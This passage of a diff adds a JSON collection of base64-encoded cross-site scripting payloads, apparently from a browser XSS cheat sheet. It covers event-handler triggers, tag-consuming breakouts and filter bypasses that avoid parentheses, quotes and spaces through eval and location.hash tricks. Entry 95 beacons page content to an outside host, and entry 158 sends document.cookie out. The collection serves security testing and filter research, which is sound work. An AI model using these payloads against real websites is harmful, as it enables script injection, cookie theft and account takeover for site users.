+		"script" : "PHhzcyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ3N0YXJ0PSJhbGVydCgxKSIgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 77,
+		"summary" : "Event handlers",
+		"description" : "Triggered dropping a draggable element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PHhzcyBvbmRyb3A9YWxlcnQoMSkgY29udGVudGVkaXRhYmxlIHN0eWxlPWRpc3BsYXk6YmxvY2s+ZHJvcCBoZXJlPC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 78,
+		"summary" : "Event handlers",
+		"description" : "Fires when an element loses focus, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmZvY3Vzb3V0PWFsZXJ0KDEpIGF1dG9mb2N1cyB0YWJpbmRleD0xIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPjxpbnB1dCB2YWx1ZT1jbGlja21lPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 79,
+		"summary" : "Event handlers",
+		"description" : "Triggered when a form is submitted, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGZvcm0gb25mb3JtZGF0YT0iYWxlcnQoMSkiPjxidXR0b24+Q2xpY2s8L2J1dHRvbj48L2Zvcm0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 80,
+		"summary" : "Event handlers",
+		"description" : "Fires when a video changes full screen status, , Does work in Firefox, ",
+		"script" : "PHZpZGVvIG9uZnVsbHNjcmVlbmNoYW5nZT1hbGVydCgxKSBzcmM9dmFsaWR2aWRlby5tcDQgY29udHJvbHM+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 81,
+		"summary" : "Event handlers",
+		"description" : "Requires as change of value, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGlucHV0IG9uaW5wdXQ9YWxlcnQoMSkgdmFsdWU9eHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 82,
+		"summary" : "Event handlers",
+		"description" : "Requires a form submission with an element that does not satisfy its constraints such as a required attribute., Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGZvcm0+PGlucHV0IG9uaW52YWxpZD1hbGVydCgxKSByZXF1aXJlZD48aW5wdXQgdHlwZT1zdWJtaXQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 83,
+		"summary" : "Event handlers",
+		"description" : "Triggered when a key is pressed, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmtleWRvd249ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGUgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 84,
+		"summary" : "Event handlers",
+		"description" : "Triggered when a key is pressed, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmtleXByZXNzPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 85,
+		"summary" : "Event handlers",
+		"description" : "Triggered when a key is released, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmtleXVwPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 86,
+		"summary" : "Event handlers",
+		"description" : "Triggered when the mouse is pressed, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbm1vdXNlZG93bj0iYWxlcnQoMSkiIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 87,
+		"summary" : "Event handlers",
+		"description" : "Triggered when the mouse is hovered over the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbm1vdXNlZW50ZXI9ImFsZXJ0KDEpIiBzdHlsZT1kaXNwbGF5OmJsb2NrPnRlc3Q8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 88,
+		"summary" : "Event handlers",
+		"description" : "Triggered when the mouse is moved away from the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbm1vdXNlbGVhdmU9ImFsZXJ0KDEpIiBzdHlsZT1kaXNwbGF5OmJsb2NrPnRlc3Q8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 89,
+		"summary" : "Event handlers",
+		"description" : "Requires mouse movement, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbm1vdXNlbW92ZT0iYWxlcnQoMSkiIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 90,
+		"summary" : "Event handlers",
+		"description" : "Triggered when the mouse is moved away from the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbm1vdXNlb3V0PSJhbGVydCgxKSIgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 91,
+		"summary" : "Event handlers",
+		"description" : "Requires a hover over the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbm1vdXNlb3Zlcj0iYWxlcnQoMSkiIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 92,
+		"summary" : "Event handlers",
+		"description" : "Triggered when the mouse button is released, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbm1vdXNldXA9ImFsZXJ0KDEpIiBzdHlsZT1kaXNwbGF5OmJsb2NrPnRlc3Q8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 93,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mousewheel scrolls, Does work in Chrome, , ",
+		"script" : "PHhzcyBvbm1vdXNld2hlZWw9YWxlcnQoMSkgc3R5bGU9ZGlzcGxheTpibG9jaz5yZXF1aXJlcyBzY3JvbGxpbmc=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 94,
+		"summary" : "Event handlers",
+		"description" : "Fires when a video changes full screen status, , Does work in Firefox, ",
+		"script" : "PHZpZGVvIG9ubW96ZnVsbHNjcmVlbmNoYW5nZT1hbGVydCgxKSBzcmM9dmFsaWR2aWRlby5tcDQgY29udHJvbHM+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 95,
+		"summary" : "Event handlers",
+		"description" : "Fires when the page is changed, Does work in Chrome, Does work in Firefox, ",
+		"script" : "PGJvZHkgb25wYWdlaGlkZT1uYXZpZ2F0b3Iuc2VuZEJlYWNvbignLy9zc2wucG9ydHN3aWdnZXItbGFicy5uZXQvJyxkb2N1bWVudC5ib2R5LmlubmVySFRNTCk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 96,
+		"summary" : "Event handlers",
+		"description" : "Requires you paste a piece of text, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGEgb25wYXN0ZT0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 97,
+		"summary" : "Event handlers",
+		"description" : "Requires clicking the element to pause, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGF1dG9wbGF5IGNvbnRyb2xzIG9ucGF1c2U9YWxlcnQoMSk+PHNvdXJjZSBzcmM9InZhbGlkYXVkaW8ud2F2IiB0eXBlPSJhdWRpby93YXYiPjwvYXVkaW8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 98,
+		"summary" : "Event handlers",
+		"description" : "You need to make a selection and drag the text using a laptop touchpad., Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJjYW5jZWw9YWxlcnQoMSk+WFNTPC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 99,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mouse down, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJkb3duPWFsZXJ0KDEpIHN0eWxlPWRpc3BsYXk6YmxvY2s+WFNTPC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 100,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mouseenter, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJlbnRlcj1hbGVydCgxKSBzdHlsZT1kaXNwbGF5OmJsb2NrPlhTUzwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 101,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mouseleave, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJsZWF2ZT1hbGVydCgxKSBzdHlsZT1kaXNwbGF5OmJsb2NrPlhTUzwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 102,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mouse move, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJtb3ZlPWFsZXJ0KDEpIHN0eWxlPWRpc3BsYXk6YmxvY2s+WFNTPC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 103,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mouse out, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJvdXQ9YWxlcnQoMSkgc3R5bGU9ZGlzcGxheTpibG9jaz5YU1M8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 104,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mouseover, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJvdmVyPWFsZXJ0KDEpIHN0eWxlPWRpc3BsYXk6YmxvY2s+WFNTPC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 105,
+		"summary" : "Event handlers",
+		"description" : "Fires when the pointer changes, Does work in Chrome, , ",
+		"script" : "PHhzcyBvbnBvaW50ZXJyYXd1cGRhdGU9YWxlcnQoMSkgc3R5bGU9ZGlzcGxheTpibG9jaz5YU1M8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 106,
+		"summary" : "Event handlers",
+		"description" : "Fires when the mouse up, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbnBvaW50ZXJ1cD1hbGVydCgxKSBzdHlsZT1kaXNwbGF5OmJsb2NrPlhTUzwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 107,
+		"summary" : "Event handlers",
+		"description" : "Fires when the speed of the video changes, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIGF1dG9wbGF5IG9ucmF0ZWNoYW5nZT1hbGVydCgxKT48c291cmNlIHNyYz0idmFsaWRhdWRpby53YXYiIHR5cGU9ImF1ZGlvL3dhdiI+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 108,
+		"summary" : "Event handlers",
+		"description" : "Requires a click, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGZvcm0gb25yZXNldD1hbGVydCgxKT48aW5wdXQgdHlwZT1yZXNldD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 109,
+		"summary" : "Event handlers",
+		"description" : "Fires when a form is submitted and the input has a type attribute of search, Does work in Chrome, , ",
+		"script" : "PGZvcm0+PGlucHV0IHR5cGU9c2VhcmNoIG9uc2VhcmNoPWFsZXJ0KDEpIHZhbHVlPSJIaXQgcmV0dXJuIiBhdXRvZm9jdXM+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 110,
+		"summary" : "Event handlers",
+		"description" : "Requires clicking the element timeline, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGF1dG9wbGF5IGNvbnRyb2xzIG9uc2Vla2VkPWFsZXJ0KDEpPjxzb3VyY2Ugc3JjPSJ2YWxpZGF1ZGlvLndhdiIgdHlwZT0iYXVkaW8vd2F2Ij48L2F1ZGlvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 111,
+		"summary" : "Event handlers",
+		"description" : "Requires clicking the element timeline, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGF1dG9wbGF5IGNvbnRyb2xzIG9uc2Vla2luZz1hbGVydCgxKT48c291cmNlIHNyYz0idmFsaWRhdWRpby53YXYiIHR5cGU9ImF1ZGlvL3dhdiI+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 112,
+		"summary" : "Event handlers",
+		"description" : "Requires you select text, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGlucHV0IG9uc2VsZWN0PWFsZXJ0KDEpIHZhbHVlPSJYU1MiIGF1dG9mb2N1cz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 113,
+		"summary" : "Event handlers",
+		"description" : "Fires when text selection is changed on the page, Does work in Chrome, , Does work in Safari",
+		"script" : "PGJvZHkgb25zZWxlY3Rpb25jaGFuZ2U9YWxlcnQoMSk+c2VsZWN0IHNvbWUgdGV4dA==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 114,
+		"summary" : "Event handlers",
+		"description" : "Fires when beginning a text selection, Does work in Chrome, , Does work in Safari",
+		"script" : "PGJvZHkgb25zZWxlY3RzdGFydD1hbGVydCgxKT5zZWxlY3Qgc29tZSB0ZXh0",
+		"type" : "XSS"
+	},
+	{
+		"id" : 115,
+		"summary" : "Event handlers",
+		"description" : "Fires context menu is shown, , Does work in Firefox, ",
+		"script" : "PGRpdiBjb250ZXh0bWVudT14c3M+PHA+UmlnaHQgY2xpY2s8bWVudSB0eXBlPWNvbnRleHQgaWQ9eHNzIG9uc2hvdz1hbGVydCgxKT48L21lbnU+PC9kaXY+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 116,
+		"summary" : "Event handlers",
+		"description" : "Requires a form submission, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGZvcm0gb25zdWJtaXQ9YWxlcnQoMSk+PGlucHV0IHR5cGU9c3VibWl0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 117,
+		"summary" : "Event handlers",
+		"description" : "Fires when the a popop element is toggled, Does work in Chrome, , ",
+		"script" : "PGJ1dHRvbiBwb3BvdmVydGFyZ2V0PXg+Q2xpY2sgbWU8L2J1dHRvbj48eHNzIG9udG9nZ2xlPWFsZXJ0KDEpIHBvcG92ZXIgaWQ9eD5YU1M8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 118,
+		"summary" : "Event handlers",
+		"description" : "Fires when the touch screen, only mobile device, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb250b3VjaGVuZD1hbGVydCgxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 119,
+		"summary" : "Event handlers",
+		"description" : "Fires when the touch screen and move, only mobile device, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb250b3VjaG1vdmU9YWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 120,
+		"summary" : "Event handlers",
+		"description" : "Fires when the touch screen, only mobile device, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb250b3VjaHN0YXJ0PWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 121,
+		"summary" : "Event handlers",
+		"description" : "Requires volume adjustment, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGF1dG9wbGF5IGNvbnRyb2xzIG9udm9sdW1lY2hhbmdlPWFsZXJ0KDEpPjxzb3VyY2Ugc3JjPSJ2YWxpZGF1ZGlvLndhdiIgdHlwZT0iYXVkaW8vd2F2Ij48L2F1ZGlvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 122,
+		"summary" : "Event handlers",
+		"description" : "Fires when the video/audio attempts to play, , , Does work in Safari",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIG9ud2FpdGluZz1hbGVydCgxKT48c291cmNlIHNyYz14IHR5cGU9eD48L2F1ZGlvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 123,
+		"summary" : "Event handlers",
+		"description" : "Fires when a video changes full screen status, , , Does work in Safari",
+		"script" : "PHZpZGVvIGNvbnRyb2xzIHNyYz12YWxpZHZpZGVvLm1wNCBvbndlYmtpdGZ1bGxzY3JlZW5jaGFuZ2U9YWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 124,
+		"summary" : "Event handlers",
+		"description" : "Requires a click from a laptop touchpad., , , Does work in Safari",
+		"script" : "PHhzcyBvbndlYmtpdG1vdXNlZm9yY2VjaGFuZ2VkPWFsZXJ0KDEpPlhTUzwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 125,
+		"summary" : "Event handlers",
+		"description" : "Requires a click from a laptop touchpad., , , Does work in Safari",
+		"script" : "PHhzcyBvbndlYmtpdG1vdXNlZm9yY2Vkb3duPWFsZXJ0KDEpPlhTUzwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 126,
+		"summary" : "Event handlers",
+		"description" : "Requires a click from a laptop touchpad., , , Does work in Safari",
+		"script" : "PHhzcyBvbndlYmtpdG1vdXNlZm9yY2V1cD1hbGVydCgxKT5YU1M8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 127,
+		"summary" : "Event handlers",
+		"description" : "Requires a click from a laptop touchpad., , , Does work in Safari",
+		"script" : "PHhzcyBvbndlYmtpdG1vdXNlZm9yY2V3aWxsYmVnaW49YWxlcnQoMSk+WFNTPC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 128,
+		"summary" : "Event handlers",
+		"description" : "Fires when a video changes full screen status, , , Does work in Safari",
+		"script" : "PHZpZGVvIGNvbnRyb2xzIHNyYz12YWxpZHZpZGVvLm1wNCBvbndlYmtpdHByZXNlbnRhdGlvbm1vZGVjaGFuZ2VkPWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 129,
+		"summary" : "Event handlers",
+		"description" : "Requires a click from a laptop touchpad., , , Does work in Safari",
+		"script" : "PHhzcyBvbndlYmtpdHdpbGxyZXZlYWxib3R0b209YWxlcnQoMSk+WFNTPC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 130,
+		"summary" : "Event handlers",
+		"description" : "Fires when you use the mouse wheel, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb253aGVlbD1hbGVydCgxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 131,
+		"summary" : "Consuming tags",
+		"description" : "Noembed consuming tag, , , ",
+		"script" : "PG5vZW1iZWQ+PGltZyB0aXRsZT0iPC9ub2VtYmVkPjxpbWcgc3JjIG9uZXJyb3I9YWxlcnQoMSk+Ij48L25vZW1iZWQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 132,
+		"summary" : "Consuming tags",
+		"description" : "Noscript consuming tag, , , ",
+		"script" : "PG5vc2NyaXB0PjxpbWcgdGl0bGU9Ijwvbm9zY3JpcHQ+PGltZyBzcmMgb25lcnJvcj1hbGVydCgxKT4iPjwvbm9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 133,
+		"summary" : "Consuming tags",
+		"description" : "Style consuming tag, , , ",
+		"script" : "PHN0eWxlPjxpbWcgdGl0bGU9Ijwvc3R5bGU+PGltZyBzcmMgb25lcnJvcj1hbGVydCgxKT4iPjwvc3R5bGU+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 134,
+		"summary" : "Consuming tags",
+		"description" : "Script consuming tag, , , ",
+		"script" : "PHNjcmlwdD48aW1nIHRpdGxlPSI8L3NjcmlwdD48aW1nIHNyYyBvbmVycm9yPWFsZXJ0KDEpPiI+PC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 135,
+		"summary" : "Consuming tags",
+		"description" : "iframe consuming tag, , , ",
+		"script" : "PGlmcmFtZT48aW1nIHRpdGxlPSI8L2lmcmFtZT48aW1nIHNyYyBvbmVycm9yPWFsZXJ0KDEpPiI+PC9pZnJhbWU+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 136,
+		"summary" : "Consuming tags",
+		"description" : "xmp consuming tag, , , ",
+		"script" : "PHhtcD48aW1nIHRpdGxlPSI8L3htcD48aW1nIHNyYyBvbmVycm9yPWFsZXJ0KDEpPiI+PC94bXA+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 137,
+		"summary" : "Consuming tags",
+		"description" : "textarea consuming tag, , , ",
+		"script" : "PHRleHRhcmVhPjxpbWcgdGl0bGU9IjwvdGV4dGFyZWE+PGltZyBzcmMgb25lcnJvcj1hbGVydCgxKT4iPjwvdGV4dGFyZWE+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 138,
+		"summary" : "Consuming tags",
+		"description" : "noframes consuming tag, , , ",
+		"script" : "PG5vZnJhbWVzPjxpbWcgdGl0bGU9Ijwvbm9mcmFtZXM+PGltZyBzcmMgb25lcnJvcj1hbGVydCgxKT4iPjwvbm9mcmFtZXM+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 139,
+		"summary" : "Consuming tags",
+		"description" : "Title consuming tag, , , ",
+		"script" : "PHRpdGxlPjxpbWcgdGl0bGU9IjwvdGl0bGU+PGltZyBzcmMgb25lcnJvcj1hbGVydCgxKT4iPjwvdGl0bGU+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 140,
+		"summary" : "File upload attacks",
+		"description" : "Add blob to file object, , , ",
+		"script" : "PGlucHV0IHR5cGU9ImZpbGUiIGlkPSJmaWxlSW5wdXQiIC8+PHNjcmlwdD5jb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7Y29uc3QgZGF0YVRyYW5zZmVyID0gbmV3IERhdGFUcmFuc2ZlcigpO2NvbnN0IGZpbGUgPSBuZXcgRmlsZShbJ0hlbGxvIHdvcmxkISddLCAnaGVsbG8udHh0Jywge3R5cGU6ICd0ZXh0L3BsYWluJ30pO2RhdGFUcmFuc2Zlci5pdGVtcy5hZGQoZmlsZSk7ZmlsZUlucHV0LmZpbGVzID0gZGF0YVRyYW5zZmVyLmZpbGVzPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 141,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling, , , ",
+		"script" : "PHNjcmlwdD5vbmVycm9yPWFsZXJ0O3Rocm93IDE8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 142,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling no semi colons, , , ",
+		"script" : "PHNjcmlwdD57b25lcnJvcj1hbGVydH10aHJvdyAxPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 143,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling no semi colons using expressions, , , ",
+		"script" : "PHNjcmlwdD50aHJvdyBvbmVycm9yPWFsZXJ0LDE8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 144,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling and string eval on Chrome / Edge, , , ",
+		"script" : "PHNjcmlwdD50aHJvdyBvbmVycm9yPWV2YWwsJz1hbGVydFx4MjgxXHgyOSc8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 145,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling and string eval on Safari, , , ",
+		"script" : "PHNjcmlwdD50aHJvdyBvbmVycm9yPWV2YWwsJ2FsZXJ0XHgyODFceDI5Jzwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 146,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling and object eval on Firefox, , , ",
+		"script" : "PHNjcmlwdD57b25lcnJvcj1ldmFsfXRocm93e2xpbmVOdW1iZXI6MSxjb2x1bW5OdW1iZXI6MSxmaWxlTmFtZToxLG1lc3NhZ2U6J2FsZXJ0XHgyODFceDI5J308L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 147,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling and object eval on Firefox / Safari, , , ",
+		"script" : "PHNjcmlwdD50aHJvdyBvbmVycm9yPWV2YWwsZT1uZXcgRXJyb3IsZS5tZXNzYWdlPSdhbGVydFx4MjgxXHgyOScsZTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 148,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using exception handling and location hash eval on all browsers, , , ",
+		"script" : "PHNjcmlwdD50aHJvdyBvbmVycm9yPVVuY2F1Z2h0PWV2YWwsZT1uZXcgRXJyb3IsZS5tZXNzYWdlPScvKicrbG9jYXRpb24uaGFzaCwhIXdpbmRvdy5JbnN0YWxsVHJpZ2dlcj9lOmUubWVzc2FnZTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 149,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses, no quotes, no spaces using exception handling and location hash eval on all browsers, , , ",
+		"script" : "PHNjcmlwdD50aHJvd3t9LG9uZXJyb3I9VW5jYXVnaHQ9ZXZhbCxoPWxvY2F0aW9uLmhhc2gsZT17bGluZU51bWJlcjoxLGNvbHVtbk51bWJlcjoxLGZpbGVOYW1lOjAsbWVzc2FnZTpoWzJdK2hbMV0raH0sISF3aW5kb3cuSW5zdGFsbFRyaWdnZXI/ZTplLm1lc3NhZ2U8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 150,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers, , , ",
+		"script" : "PHNjcmlwdD50aHJvdy94LyxvbmVycm9yPVVuY2F1Z2h0PWV2YWwsaD1sb2NhdGlvbi5oYXNoLGU9RXJyb3IsZS5saW5lTnVtYmVyPWUuY29sdW1uTnVtYmVyPWUuZmlsZU5hbWU9ZS5tZXNzYWdlPWhbMl0raFsxXStoLCEhd2luZG93Lkluc3RhbGxUcmlnZ2VyP2U6ZS5tZXNzYWdlPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 151,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using ES6 hasInstance and instanceof with eval, , , ",
+		"script" : "PHNjcmlwdD4nYWxlcnRceDI4MVx4MjknaW5zdGFuY2VvZntbU3ltYm9sLmhhc0luc3RhbmNlXTpldmFsfTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 152,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using ES6 hasInstance and instanceof with eval without ., , , ",
+		"script" : "PHNjcmlwdD4nYWxlcnRceDI4MVx4MjknaW5zdGFuY2VvZntbU3ltYm9sWydoYXNJbnN0YW5jZSddXTpldmFsfTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 153,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using location redirect, , , ",
+		"script" : "PHNjcmlwdD5sb2NhdGlvbj0namF2YXNjcmlwdDphbGVydFx4MjgxXHgyOSc8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 154,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using location redirect no strings, , , ",
+		"script" : "PHNjcmlwdD5sb2NhdGlvbj1uYW1lPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 155,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using template strings, , , ",
+		"script" : "PHNjcmlwdD5hbGVydGAxYDwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 156,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses using template strings and location hash, , , ",
+		"script" : "PHNjcmlwdD5uZXcgRnVuY3Rpb25gWCR7ZG9jdW1lbnQubG9jYXRpb24uaGFzaC5zdWJzdHJgMWB9YDwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 157,
+		"summary" : "Restricted characters",
+		"description" : "No parentheses or spaces, using template strings and location hash, , , ",
+		"script" : "PHNjcmlwdD5GdW5jdGlvbmBYJHtkb2N1bWVudC5sb2NhdGlvbi5oYXNoLnN1YnN0cmAxYH1gYGA8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 158,
+		"summary" : "Restricted characters",
+		"description" : "XSS cookie exfiltration without parentheses, backticks or quotes, , , ",
+		"script" : "PHZpZGVvPjxzb3VyY2Ugb25lcnJvcj1sb2NhdGlvbj0vXDAyLnJzLytkb2N1bWVudC5jb29raWU+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 159,
+		"summary" : "Restricted characters",
+		"description" : "XSS without greater than, , , ",
